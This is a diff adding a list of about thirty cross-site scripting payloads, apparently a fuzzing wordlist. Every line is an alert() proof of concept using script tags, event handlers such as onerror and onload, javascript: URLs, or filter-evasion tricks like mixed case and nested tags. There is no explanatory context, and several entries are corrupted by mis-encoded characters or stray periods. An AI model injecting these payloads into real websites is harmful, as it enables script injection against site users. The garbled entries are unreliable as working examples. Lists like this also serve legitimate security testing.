@@ -1,0 +1,30 @@
+<script>alert(1)</script>
+<img src=1 onerror=alert(7)>
+onmouseover=¡¯alert(9)¡¯
+<table background='javascript.:alert(14)'></table>
+<object type=text/html data='javascript.:alert(15);'></object>
+"+alert(16)+"
+<body/onfocus=top.alert(17)>
+<a href="javascript:`${alert(69)}`">XSS Test</a>
+<iframe onload=location=['javascript:alert(79)'].join(")>
+<svg/onload=alert(91)
+<marquee onstart=alert(146)>
+<audio src onloadstart=alert(148)>
+<input autofocus onblur=alert(150)>
+<embed src=javascript:alert(198)>
+<math><brute href=javascript:alert(201)>click
+<BGSOUND SRC="javascript.:alert(248);">
+<STYLE>@im\port'\ja\vasc\ript:alert(260)';</STYLE>
+<STYLE. TYPE="text/css">.XSS{background-image:url("javascript.:alert(263)");}</STYLE><A CLASS=XSS></A>
+<meta charset="mac-farsi">¼script¾javascript:alert(652)¼/script¾
+<script>alert(2)</script>
+<sc<script>ript>alert(4)</script>
+<ScRipt>alert(5)</script>
+<script>alert(11);</script>
+<img src="javascript.:alert(12)">
+<script>alert(13)</script>
+<img/src=22 onerror=window.alert(22)>
+<img src=62 onerror=(function(){alert(62)})()>
+<img src=63 onerror=!function(){alert(63)}()>
+<img src=64 onerror=%2bfunction(){alert(64)}()>
+<img src=65 onerror=%2dfunction(){alert(65)}()>
